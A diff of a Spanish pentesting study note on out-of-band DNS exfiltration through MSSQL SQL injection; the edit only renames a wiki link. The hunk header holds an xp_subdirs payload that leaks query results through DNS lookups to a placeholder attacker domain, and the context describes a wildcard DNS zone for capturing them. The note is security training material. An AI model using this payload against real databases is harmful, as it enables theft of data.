@@ -54,6 +54,6 @@ EXEC('master..xp_subdirs "\\'+@A+'.'+@B+'.YOUR.DOMAIN\x"');
 - **Servidor DNS propio**: registrando una zona (un `A` record wildcard `@` apuntando a la máquina atacante) se capturan las peticiones en los logs del propio DNS —imprescindible en redes internas sin salida a Internet—.
 
 > [!info]+
-> <mark style="background: #FF5582A6;">OOB DNS no es exclusiva de SQLi</mark>: es la misma técnica que destapa el [[Explotación a ciegas|blind XPath]], el blind XXE y la blind command injection. Dominar el canal DNS sirve para toda una familia de vulnerabilidades ciegas. La limitación: el servidor objetivo debe poder hacer DNS saliente, cada vez más filtrado en entornos endurecidos.
+> <mark style="background: #FF5582A6;">OOB DNS no es exclusiva de SQLi</mark>: es la misma técnica que destapa el [[05 - XPath ciega y basada en tiempo|blind XPath]], el blind XXE y la blind command injection. Dominar el canal DNS sirve para toda una familia de vulnerabilidades ciegas. La limitación: el servidor objetivo debe poder hacer DNS saliente, cada vez más filtrado en entornos endurecidos.
 
 Más allá de leer datos, si la cuenta tiene privilegios de `sysadmin`, MSSQL permite el salto definitivo —ejecutar comandos del sistema—: [[10 - MSSQL ejecución de comandos con xp_cmdshell]].
